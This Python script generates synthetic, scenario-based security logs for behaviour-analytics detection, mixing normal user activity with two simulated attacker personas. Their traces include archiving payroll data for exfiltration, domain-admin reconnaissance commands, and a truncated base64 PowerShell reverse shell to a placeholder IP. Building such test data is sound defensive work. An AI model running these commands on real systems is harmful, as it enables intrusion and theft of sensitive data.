
import argparse
import random
import os
import json
import csv
import uuid
from faker import Faker
from datetime import datetime, timedelta


HOSTS = [f"host-{i}" for i in range(1, 8)]
fake = Faker()


PERSONAS = [
    {'user_id': 'bgriffin', 'role': 'engineering', 'home_ip': '203.0.113.54', 'home_host': 'host-1', 'behavior': 'normal'},
    {'user_id': 'srogers', 'role': 'engineering', 'home_ip': '198.51.100.23', 'home_host': 'host-1', 'behavior': 'attacker_data_exfil'},
    {'user_id': 'jpeterson', 'role': 'sales', 'home_ip': '192.0.2.142', 'home_host': 'host-2', 'behavior': 'normal'},
    {'user_id': 'lrobinson', 'role': 'sales', 'home_ip': '203.0.113.78', 'home_host': 'host-2', 'behavior': 'normal'},
    {'user_id': 'maria95', 'role': 'finance', 'home_ip': '198.51.100.101', 'home_host': 'host-3', 'behavior': 'normal'},
    {'user_id': 'xreid', 'role': 'hr', 'home_ip': '192.0.2.205', 'home_host': 'host-4', 'behavior': 'normal'},
    {'user_id': 'amandasanchez', 'role': 'it', 'home_ip': '203.0.113.112', 'home_host': 'host-5', 'behavior': 'attacker_living_off_land'},
    {'user_id': 'michellejames', 'role': 'exec', 'home_ip': '198.51.100.5', 'home_host': 'host-6', 'behavior': 'normal'}
]


def make_auth_line(ts, host, user, src_ip, success=True):
    pid = random.randint(1000, 99999)
    res = "Accepted" if success else "Failed"
    port = random.randint(1024, 65000)
    return f"{ts.strftime('%b %d %H:%M:%S')} {host} sshd[{pid}]: {res} password for {user} from {src_ip} port {port} ssh2\n"

def make_file_audit_row(ts, user, path, action, bytes_):
    return [ts.isoformat() + "Z", user, path, action, bytes_]

def make_endpoint_proc(ts, user, host, process, cmdline):
    return json.dumps({
        "timestamp": ts.isoformat() + "Z", "user": user, "host": host,
        "process": process, "cmdline": cmdline, "event_type": "process_start"
    }) + "\n"

def make_firewall_line(ts, host, action, src_ip, dst_ip, dst_port, bytes_):
    return f"{ts.strftime('%b %d %H:%M:%S')} {host} FIREWALL: {action} proto=TCP src={src_ip}:{random.randint(1024, 65000)} dst={dst_ip}:{dst_port} bytes={bytes_}\n"
    
def make_windows_event(ts, host, user, ev_id, message):
    return json.dumps({
        "TimeCreated": ts.isoformat() + "Z", "Host": host, "User": user,
        "EventID": ev_id, "Level": "Information", "Message": message
    }) + "\n"


def generate_normal_activity(writers, persona, base_time):
    """Generates typical, role-based activity for a user."""
    user = persona['user_id']
    role = persona['role']
    
    if random.random() < 0.7:
        writers['auth'].write(make_auth_line(base_time, persona['home_host'], user, persona['home_ip'], success=True))

    if role == 'engineering':
        if random.random() < 0.3:
            writers['proc'].write(make_endpoint_proc(base_time, user, persona['home_host'], 'git', 'git pull origin main'))
        if random.random() < 0.2:
            writers['file'].writerow(make_file_audit_row(base_time, user, '/app/src/main.py', 'READ', 1024))

    elif role == 'finance':
        if random.random() < 0.2:
            writers['file'].writerow(make_file_audit_row(base_time, user, '/shared/finance/Q3_report.xlsx', 'WRITE', 512000))

    elif role == 'hr':
        if random.random() < 0.15:
            writers['file'].writerow(make_file_audit_row(base_time, user, '/shared/hr/candidates.csv', 'READ', 204800))

def generate_attack_data_exfil(writers, persona, base_time):
    """Simulates a multi-step data exfiltration attack."""
    user = persona['user_id']
    host = persona['home_host']
    attacker_ip = fake.ipv4_public() #  non-standard IP
    exfil_ip = '104.22.9.115' # suspicious external IP
    
    writers['auth'].write(make_auth_line(base_time, host, user, attacker_ip, success=True))
    
    time_step2 = base_time + timedelta(minutes=5)
    writers['file'].writerow(make_file_audit_row(time_step2, user, '/shared/hr/payroll.csv', 'READ', 3500000))
    
    time_step3 = base_time + timedelta(minutes=7)
    writers['proc'].write(make_endpoint_proc(time_step3, user, host, '7z.exe', '7z a -p"secret" C:\\Users\\Public\\payroll.zip /shared/hr/payroll.csv'))

    time_step4 = base_time + timedelta(minutes=10)
    writers['fw'].write(make_firewall_line(time_step4, host, 'ALLOW', persona['home_ip'], exfil_ip, 8443, 3500500))

def generate_attack_living_off_land(writers, persona, base_time):
    user = persona['user_id']
    host = persona['home_host']
    
    writers['auth'].write(make_auth_line(base_time, host, user, persona['home_ip'], success=True))
    
    time_step2 = base_time + timedelta(minutes=2)
    writers['proc'].write(make_endpoint_proc(time_step2, user, host, 'whoami.exe', 'whoami /groups'))

    time_step3 = base_time + timedelta(minutes=3)
    writers['proc'].write(make_endpoint_proc(time_step3, user, host, 'net.exe', 'net group "Domain Admins" /domain'))
    
    time_step4 = base_time + timedelta(minutes=6)
    encoded_command = "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMwA0ACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0A..."
    writers['proc'].write(make_endpoint_proc(time_step4, user, host, 'powershell.exe', encoded_command))

    time_step5 = base_time + timedelta(minutes=10)
    writers['win'].write(make_windows_event(time_step5, host, user, 7045, "A new service was installed: 'UpdaterService'"))


def main(count=2000, outdir="data/raw"):
    os.makedirs(outdir, exist_ok=True)
    
    files = {
        "auth": open(os.path.join(outdir, "auth.log"), "w"),
        "fw": open(os.path.join(outdir, "firewall.log"), "w"),
        "win": open(os.path.join(outdir, "windows_events.jsonl"), "w"),
        "proc": open(os.path.join(outdir, "endpoint_proc.jsonl"), "w"),
        "file_csv": open(os.path.join(outdir, "file_audit.csv"), "w", newline='')
    }
    writers = {'file': csv.writer(files['file_csv']), **{k: v for k, v in files.items() if k != 'file_csv'}}
    writers['file'].writerow(["timestamp", "user", "path", "action", "bytes"])
    
    start_time = datetime.utcnow() - timedelta(days=7)
    
    print(f"Generating {count} events...")
    for i in range(count):
        persona = random.choice(PERSONAS)
        event_time = start_time + timedelta(seconds=random.randint(0, 7*24*3600))
        

        is_attack = persona['behavior'] != 'normal' and random.random() < 0.05

        if is_attack:
            if persona['behavior'] == 'attacker_data_exfil':
                generate_attack_data_exfil(writers, persona, event_time)
            elif persona['behavior'] == 'attacker_living_off_land':
                generate_attack_living_off_land(writers, persona, event_time)
        else:
            generate_normal_activity(writers, persona, event_time)

    for f in files.values():
        f.close()
        
    print(f"Wrote synthetic, scenario-based logs to {outdir}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate realistic, scenario-based log data for UEBA.")
    parser.add_argument("--count", type=int, default=2000, help="Approximate number of event clusters to generate.")
    parser.add_argument("--outdir", default="data/raw", help="Directory to save the raw log files.")
    args = parser.parse_args()
    main(args.count, args.outdir)